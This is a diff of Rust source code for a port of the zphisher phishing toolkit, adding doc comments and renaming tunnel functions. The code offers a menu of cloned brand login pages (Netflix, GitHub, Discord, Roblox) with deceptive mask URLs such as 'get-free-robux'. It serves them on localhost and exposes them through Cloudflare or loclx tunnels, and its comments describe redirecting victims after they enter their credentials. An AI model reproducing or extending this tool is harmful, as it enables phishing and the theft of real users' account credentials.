@@ -20,12 +20,18 @@ use regex::Regex;
 use zip::read::ZipFile;
 use zip::ZipArchive;
 use crate::errors::TerminalError;
+use crate::web_server::start_webserver;
 //#[cfg(target_os = "windows")] use std::thread::sleep;
 // #[cfg(target_os = "windows")] use std::time::Duration; use zip::read::ZipFile; use zip::ZipArchive;
-// use rayon::prelude::*; use regex::Regex; use zip::read::ZipFile; use zip::ZipArchive; use crate::errors::TerminalError;
-use crate::web_server::start_webserver;
+// use rayon::prelude::*; use regex::Regex; use zip::read::ZipFile; use zip::ZipArchive; use crate::errors::TerminalError; use crate::web_server::start_webserver;
 
-
+///
+///# Does the following:
+/// - Runs as first function in the program
+/// - Creates required directories if they don't exist
+/// - Removes unnecessary files if they exist
+///
+#[warn(missing_docs)]
 pub fn setup_directories() {
     let base_dir = match get_data_dir() {
         Some(e) => e.join("zphisher"),
@@ -106,12 +112,15 @@ pub fn banner_small() {
     println!();
 }
 
+///
+/// Checks certain Processes and kills them, if they are running to prevent any errors
+///
 #[cfg(target_os = "windows")]
+#[warn(missing_docs)]
 pub fn kill_pid() {
     log::info!("Killing processes");
     use sysinfo::{ProcessExt, System, SystemExt};
     let processes_to_kill = [
-        "php.exe",
         "cloudflared-windows-amd64.exe",
         "loclx.exe",
         "cloudflared-windows-386.exe",
@@ -132,9 +141,13 @@ pub fn kill_pid() {
     }
 }
 
+///
+/// Checks certain Processes and kills them, if they are running to prevent any errors
+///
 #[cfg(target_os = "linux")]
+#[warn(missing_docs)]
 pub fn kill_pid() {
-    let processes_to_kill = ["php", "cloudflared", "loclx"];
+    let processes_to_kill = ["cloudflared", "loclx"];
     let procs = match procfs::process::all_processes() {
         Ok(p) => p,
         Err(e) => {
@@ -178,10 +191,15 @@ pub fn kill_pid() {
     }
 }
 
-
+///
+/// - Downloads a file from a given url
+/// - Extracts downloaded file, if it's compressed.
+///
+/// Make sure to use `await` when calling this function as it is `async`.
+///
+#[warn(missing_docs)]
 async fn download(url: &str) -> Result<PathBuf, Box<dyn std::error::Error>> {
     // check in the url if its a loclx file
-
     let filename: &str = url.split('/').last().unwrap_or("tmp.bin");
     dbg!(&filename);
     let file_name = if filename.contains("loclx") {
@@ -309,7 +327,7 @@ async fn download(url: &str) -> Result<PathBuf, Box<dyn std::error::Error>> {
                 return Err("Unknown file type".into());
             }
 
-            #[cfg(not(target_os = "windows"))]
+            #[cfg(target_os = "linux")]
             _ => {
                 out_path = target_path;
             }
@@ -322,6 +340,11 @@ async fn download(url: &str) -> Result<PathBuf, Box<dyn std::error::Error>> {
     Ok(target_path)
 }
 
+
+///
+/// Checks for dependencies and installs them if they don't exist
+///
+#[warn(missing_docs)]
 pub async fn install_dependencies() {
     log::info!("Checking dependencies");
     log_msg("Checking for dependencies... (installing them, if they don't exist)");
@@ -353,16 +376,6 @@ pub async fn install_dependencies() {
         return;
     }
     for download_link in &download_links {
-        /*
-        #[cfg(not(target_os = "windows"))] let bin_path = match exe_path.parent() {
-            Some(p) => p.join(get_server_dir().unwrap_or(BIN_PATH.into())), // Join "bin" directory here.
-            None => {
-                log::error!("Failed to get current executable path");
-                error_msg("Failed to get current executable path");
-                return;
-            }
-        };*/
-
         log::info!("Bin Path (S281): {:?}", bin_path);
 
         if !bin_path.exists() {
@@ -382,7 +395,7 @@ pub async fn install_dependencies() {
                     error_msg(&format!("Failed to install {}: {e}", p.display()));
                 }
 
-                #[cfg(not(target_os = "windows"))]
+                #[cfg(target_os = "linux")]
                 if let Err(e) = Command::new("chmod").arg("+x").arg(&p).output() {
                     log::error!("Failed to give execute permissions to {}: {e}", p.display());
                     error_msg(&format!(
@@ -399,6 +412,12 @@ pub async fn install_dependencies() {
     };
 }
 
+///
+/// Input-function for port selection
+///<br>
+/// Returns an `Option<u16>`, which is `None` if the user wants to use [the default port](PORT)
+///
+#[warn(missing_docs)]
 pub fn custom_port_input() -> Result<Option<u16>, TerminalError> {
     loop {
         print!("{}{}", "Enter Your Custom 4-digit Port [1024-9999] (empty = 8080) : ".cyan(), String::new().white());
@@ -428,6 +447,11 @@ pub fn custom_port_input() -> Result<Option<u16>, TerminalError> {
     }
 }
 
+///
+/// Input-function for [`site_selection`]
+///
+/// Returns a `u16` which is the site number
+#[warn(missing_docs)]
 pub fn site_input() -> Result<u16, TerminalError> {
     loop {
         print!("{}{}", "Select a site: ".cyan(), String::new().white());
@@ -453,9 +477,19 @@ pub fn site_input() -> Result<u16, TerminalError> {
 }
 
 
+///
+/// lets the user select a site.
+///
+/// # Returns
+/// - site name in lowercase _(e.g. `"netflix"`)_
+/// - default mask URL _(e.g. `"https://upgrade-your-netflix-plan-free"`)_
+/// - original site URL _(e.g. `"https://www.netflix.com/"`)_
+///
+#[warn(missing_docs)]
 pub fn site_selection<'a>() -> (&'a str, Option<&'a str>, Option<&'a str>) {
     loop {
-        let selection = match site_input() {
+        let selection
+            = match site_input() {
             Ok(s) => s,
             Err(e) => {
                 log::error!("Failed to get site input: {}", e);
@@ -499,6 +533,7 @@ pub fn site_selection<'a>() -> (&'a str, Option<&'a str>, Option<&'a str>) {
             33 => return ("github", Some("https://get-1k-followers-on-github-free"), Some("https://github.com/")),
             34 => return ("discord", Some("https://get-discord-nitro-free"), Some("https://discord.com/")),
             35 => return ("roblox", Some("https://get-free-robux"), Some("https://www.roblox.com/")),
+            // These are commands
             99 => return ("about", None, None),
             0 => return ("exit", None, None),
             _ => {
@@ -509,7 +544,15 @@ pub fn site_selection<'a>() -> (&'a str, Option<&'a str>, Option<&'a str>) {
     }
 }
 
-
+///
+/// Starts a localhost server on [user specified port](custom_port_input) or [default port](PORT)
+///
+/// # Arguments
+///
+/// * `site` - The site that should be hosted on localhost
+/// * `redirect_url` - The URL that should be redirected to after the user has entered their credentials
+///
+#[warn(missing_docs)]
 pub async fn start_localhost(site: &str, redirect_url: String) -> Result<(), TerminalError> {
     let custom_port: Option<u16> = custom_port_input()?;
     log::info!("Starting localhost on port {}", custom_port.unwrap_or(PORT));
@@ -519,6 +562,18 @@ pub async fn start_localhost(site: &str, redirect_url: String) -> Result<(), Ter
     Ok(())
 }
 
+
+///
+/// - Provides a menu for the user to select a tunnel server after [site selection](site_selection)
+///
+/// - Starts a tunnel/localhost server with the [tunnel_selection] function
+///
+/// # Arguments
+///
+/// * `site` - The site that should be hosted on server
+/// * `redirect_url` - The URL that should be redirected to after the user has entered their credentials
+///
+#[warn(missing_docs)]
 pub async fn tunnel_menu(site: &str, redirect_url: String) -> Result<(), TerminalError> {
     clear_terminal()?;
     banner_small();
@@ -544,10 +599,18 @@ pub async fn tunnel_menu(site: &str, redirect_url: String) -> Result<(), Termina
     Ok(())
 }
 
-
-pub fn get_input_number(msg: &str) -> Result<u32, TerminalError> {
+///
+/// Basic Number input, will loop until a valid number is entered
+///
+/// Returns a [`Result`] with the number(type: `u32`) entered by the user
+///
+/// # Arguments
+///
+/// * `prompt` - The prompt that should be displayed to the user (e.g. `"Enter a number: "`)
+///
+pub fn get_input_number(prompt: &str) -> Result<u32, TerminalError> {
     loop {
-        print!("{}", msg);
+        print!("{}", prompt);
         stdout().flush()?;
 
         let mut input = String::new();
@@ -564,12 +627,23 @@ pub fn get_input_number(msg: &str) -> Result<u32, TerminalError> {
     }
 }
 
+
+
+///
+/// Final input handler for tunnel selection
+///
+/// passes the user input to the [`start_localhost`] or [`start_cloudflare`] function
+/// # Arguments
+/// * `site` - The site that should be hosted on server
+/// * `redirect_url` - The URL that should be redirected to after the user has entered their credentials
+///
+#[warn(missing_docs)]
 pub async fn tunnel_selection(site: &str, redirect_url: String) -> Result<(), TerminalError> {
     loop {
         let selection: u32 = get_input_number("Select a tunnel: ")?;
         match selection {
             1 => return start_localhost(site, redirect_url).await,
-            2 => return start_cloudflared(site, redirect_url).await,
+            2 => return start_cloudflare(site, redirect_url).await,
             3 => {
                 error_msg("Not implemented yet");
                 continue;
@@ -583,7 +657,16 @@ pub async fn tunnel_selection(site: &str, redirect_url: String) -> Result<(), Te
     }
 }
 
-
+///
+/// Starts a [webserver](start_webserver) running on [Actix](https://actix.rs/)
+///
+/// # Arguments
+///
+/// * `site` - The site that should be hosted on server
+/// * `port` (optional) - The port that should be used for the server
+/// * `redirect_url` - The URL that should be redirected to after the user has entered their credentials
+///
+#[warn(missing_docs)]
 pub async fn setup_site(site: &str, port: Option<u16>, redirect_url: String) -> Result<(), TerminalError> {
     log::info!("Setting up site");
     println!("{} {}", "Setting up server...".green(), "Please wait".cyan());
@@ -601,23 +684,17 @@ pub async fn setup_site(site: &str, port: Option<u16>, redirect_url: String) -> 
 }
 
 
-
-fn get_cldflr_url(cus_port: Option<u16>) -> Result<String, TerminalError> {
+///
+/// Initially tunnels the localhost server using [Cloudflare](https://www.cloudflare.com/)
+///
+/// # Returns
+///
+/// * a [`Result`] with the URL of the tunnel
+///
+#[warn(missing_docs)]
+fn cloudflare_init(cus_port: Option<u16>) -> Result<String, TerminalError> {
     log::info!("getting cloudflared url");
-    #[cfg(target_os = "windows")]
-    let output = Command::new("powershell")
-        .arg("-Command")
-        .arg(get_cloudflare_file())
-        .arg("tunnel")
-        .arg("--url")
-        .arg(format!("http://{}:{}", HOST, cus_port.unwrap_or(PORT)))
-        .arg("--logfile").arg(".cld.log")
-        .arg("--http2-origin")
-        .stdout(Stdio::null())
-        .stderr(Stdio::inherit())
-        .spawn()
-        .expect("Failed to start cloudflared");
-
+    #[cfg(target_os = "windows")] let output = Command::new("powershell").arg("-Command").arg(get_cloudflare_file()).arg("tunnel").arg("--url").arg(format!("http://{}:{}", HOST, cus_port.unwrap_or(PORT))).arg("--logfile").arg(".cld.log").arg("--http2-origin").stdout(Stdio::null()).stderr(Stdio::inherit()).spawn().expect("Failed to start cloudflared");
     #[cfg(target_os = "linux")] let output = Command::new(get_cloudflare_file()).arg("tunnel").arg("--url").arg(format!("http://{}:{}", HOST, cus_port.unwrap_or(PORT))).arg("--http2-origin").stdout(Stdio::null()).stderr(Stdio::inherit()).spawn().expect("Failed to start cloudflared");
     let raw_output = output.wait_with_output()?;
     let output = String::from_utf8_lossy(&raw_output.stderr);
@@ -635,9 +712,12 @@ fn get_cldflr_url(cus_port: Option<u16>) -> Result<String, TerminalError> {
     Err("URL not found".into())
 }
 
-
-pub async fn start_cloudflared(site: &str, redirect_url: String) -> Result<(), TerminalError> {
-    log::info!("Starting cloudflared");
+///
+/// Locates the `site` directory and starts the [Cloudflare tunnel](cloudflare_init) in a separate [thread]
+///
+#[warn(missing_docs)]
+pub async fn start_cloudflare(site: &str, redirect_url: String) -> Result<(), TerminalError> {
+    log::info!("Starting cloudflare");
     // remove ".cld.log" file if exists
     let cld_log = match get_server_dir() {
         Some(s) => s,
@@ -663,9 +743,9 @@ pub async fn start_cloudflared(site: &str, redirect_url: String) -> Result<(), T
 
 
     thread::spawn(move || {
-        println!("{}", get_cldflr_url(cus_port).unwrap_or_else(|e| {
-            log::error!("Failed to get cloudflared URL: {}", e);
-            error_msg(&format!("Failed to get cloudflared URL: {}", e));
+        println!("{}", cloudflare_init(cus_port).unwrap_or_else(|e| {
+            log::error!("Failed to get cloudflare URL: {}", e);
+            error_msg(&format!("Failed to get cloudflare URL: {}", e));
             exit(1);
         }));
     });
@@ -687,6 +767,9 @@ pub fn about() {
     println!();
 }
 
+///
+/// Main menu of the program, which is the first thing the user sees
+///
 pub async fn main_menu() -> Result<(), TerminalError> {
     loop {
         clear_terminal()?;
